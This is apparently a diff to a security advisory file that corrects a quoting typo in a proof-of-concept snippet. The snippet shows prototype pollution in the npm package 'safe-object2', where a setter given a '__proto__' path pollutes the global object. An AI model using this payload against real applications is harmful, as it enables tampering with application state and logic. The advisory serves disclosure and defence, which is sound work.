@@ -4,7 +4,7 @@
 
 # Proof of Concept
 ```
-const safeObj2 = require(""safe-object2"");
+const safeObj2 = require("safe-object2");
 const obj = safeObj2({});
 obj.setter(['__proto__', 'polluted'], true)
 console.log(polluted); // true
